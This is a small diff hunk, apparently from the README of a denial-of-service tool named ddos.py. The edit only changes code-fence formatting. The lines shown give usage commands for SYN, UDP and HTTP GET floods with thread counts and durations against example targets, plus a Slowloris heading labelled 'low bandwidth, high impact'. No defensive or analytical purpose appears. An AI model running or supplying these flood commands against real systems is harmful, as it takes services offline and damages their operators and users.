@@ -21,8 +21,8 @@ sudo python3 ddos.py -t 192.168.1.100 -p 80 -d 60 -T 200 -v syn ```
 python3 ddos.py -t target.com -p 53 -d 120 -T 500 -v udp 
 
 # HTTP GET flood
-```
-python3 ddos.py -t https://target.com -d 300 -T 300 -v http```
+
+python3 ddos.py -t https://target.com -d 300 -T 300 -v http
 
 # Slowloris (low bandwidth, high impact)
 ```
